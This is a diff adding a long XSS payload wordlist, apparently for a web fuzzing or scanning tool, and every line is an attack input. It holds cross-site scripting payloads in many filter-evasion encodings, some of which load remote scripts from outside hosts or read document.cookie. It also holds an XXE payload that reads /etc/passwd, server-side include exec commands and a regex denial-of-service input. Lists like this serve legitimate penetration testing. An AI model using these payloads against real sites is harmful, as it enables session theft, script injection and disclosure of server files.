+<XSS STYLE="xss:expression(document.vulnerable=true)">
+%3Ealert(1)%3C/script%3E
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
+&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+&lt;SCRIPT&gt;a=/XSS/
+<;IMG SRC=";mocha:[code]";>;
+'-alert(1)//
+left:e\0078pr\0065ssion(alert('XSS'))
+&#x00003c
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&#x03C
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+&#X0003C
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
+<img src="livescript:document.vulnerable=true;">
+<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
+xss=500); alert(document.cookie);//
+&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
+\u003c
+exp/*<A STYLE='no\xss:noxss("*//*");
+&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+‘)alert(1);//
+&LT;
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<object data="data:text/html;base64,%(base64)s">
+&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
+INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+'>alert(1)</script><script/1='
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+&#X03c
+http://xss.rocks/scriptlet.html
+&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
+<embed src="data:text/html;base64,%(base64)s">
+<link rel="import" href="test.svg" />
+<!-- complete comment -->
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
+'); alert('XSS
+&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
+<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+alert(String.fromCharCode(88,83,83));'))">
+<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
+%u00ABscript%u00BB
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<XSS STYLE="behavior: url(%(htc)s);">
+alert(
+&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
+&#X3c
+<a
+left:\ff25\ff38\ff30\ff32\ff42\ff53\ff33\ff29\ff2f\ff2e(alert('XSS'))
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
+<img src='1' onerror/=alert(0) />
+<;BR SIZE=";&;{alert(';XSS';)}";>;
+&#x3c;
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+<iframe// src=javaSCRIPT&colon;alert(1)
+';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<A href=javas%26#99;ript:alert(1)>click
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+")
+&#x00003C;
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
+&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
+<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
+"'><;(24)trela=daolno ;''=/e>'=d
+<style
+';
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
+<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
+XSS
+<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+<form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
+alert(123)
+<div
+&#X00003C;
+\";
+top[
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+<link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d
+&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+<XSS STYLE="behavior: url(xss.htc);">
+&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
+&#X3C
+alert(document.domain)
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+<? echo('<SCR)';
+Set.constructor`alert\x28document.domain\x29```
+top['al\145rt'](1)
+<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+<A HREF="http://66.102.7.147/">XSS</A>
+<div style="{ left:expression( alert('XSS') ) }">
+perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+")>
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
+left:EXPR/* */ESSION(alert('XSS'))
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+&#X003c
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
+navigator.vibrate(500)
+&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+U%2bFF1CscriptU%2bFF1E
+<style>@import "data:,*%7bx:expression(alert(30))%7D";</style>
+left:expr\65ssion(alert('XSS') ))
+<img src=http://sn1persecurity.com/.testing/xss.png>//INJECTX REMOTE
+c=\"javascript&#058;\";
+<sCriPt/src=//14.rs?
+<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
+<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+%253cscript%253ealert(1)%253c/script%253e
+&lt;? echo(&apos;&lt;SCR)&apos;;
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+"link=
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+confirm(document.cookie)
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<// style=x:expression\28alert(71)\29>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<h1>INJECTX</h1>
+href="data:text/html;base64;charset=utf-7,+AFAASABOAGoAYwBtAGwAdwBkAEQANQBqAGIAMgA1AG0AYQBYAEoAdABLAEQAUQB5AEsAVABzADgATAAzAE4AagBjAG0AbAB3AGQARAA0AD0-"	base64 in UTF-7
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
++ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+%01Jav%09asc%09ript:https://DOMAIN/%250Acon%09firm%25%281%25%29
+</br style=a:expression(alert())>
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+onload
+<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+confirm(123)
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+"'><sc\ript>confirm(42)</script>
+&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
+<?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+&#x3C
+&#x3c
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
+'); alert('xss'); var x='
+';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
+‘; alert(1);
+<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+';';;!--";<;XSS>;=&;{()}
+&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
+left:exp\0280essio\207f(alert('XSS'))
+<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
+<;SCRIPT SRC=http://ha.ckers.org/xss.js
+<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
+\";alert('XSS');//
+>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
+<![CDATA[
+&#x0003c
+<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
+data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
+<;HTML xmlns:xss>;
+<img[a][b]src=x[d]onerror[c]=[e]"alert(100)">
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+<iframe
+<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+&#X000003C
+\"+
+&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+<body style="background-color:red">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
+<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
+&#X000003c;
+-alert(1)//\
+<scrscriptipt>alert(1)</scrscriptipt>
+\74svg o\156load\75alert\501\51\76
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
+<;!--[if gte IE 4]>;
+<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
+href=
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<LAYER SRC="%(scriptlet)s"></LAYER>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+<script
+%253cscript%253ealert(document.cookie)%253c/script%253e
+"onmouseover
+"'><///style///>alert(42)</script>
+alert("test")
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+"href=
+&#X000003c
+src="http://www.site.com/XSS.js"></script>
+alert`1`
+left:\0065\0078pr\0065ssion(alert('XSS'))
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
+"onload
+%25u0022%25u0027%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e
+&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
+&#x00003c;
+&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+left:expr/**/ession(alert('XSS'))
+'">
+INJECTX
+"'><isindex action="javas&Tab;cript:alert(42)" type=image>
+<A HREF="http://1113982867/">XSS</A>
+&#x000003C;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<;SCRIPT SRC=//ha.ckers.org/.j>;
+&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage></svg>
+\");
+<style>*[{}@import'%(css)s?]</style>X
+prompt("test")
+<a href="javascript#document.vulnerable=true;">
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAOwBoAGkAcwB0AG8AcgB5AC4AYgBhAGMAawAoACkAOwA8AC8AcwBjAHIAaQBwAHQAPgAKADwAcwBjAHIAaQBwAHQAPgBjAG8AbgBmAGkAcgBtACgANAAyACkAOwA8AC8AcwBjAHIAaQBwAHQAPg-"	UTF-7 (all)
+'>><marquee><h1>XSS</h1></marquee>
+}alert(/INJECTX/);{//
+prompt(
+: \');confirm(1);//
+<x style="behavior:url(%(sct)s)">
+<img SRC='vbscript:document.vulnerable=true;'>
+&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
+echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
+<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
+<;scrscriptipt>;alert(1)<;/scrscriptipt>;
+top[8680439..toString(30)](1)
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+<link
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
+crowdshield
+&lt;? echo('&lt;SCR)';
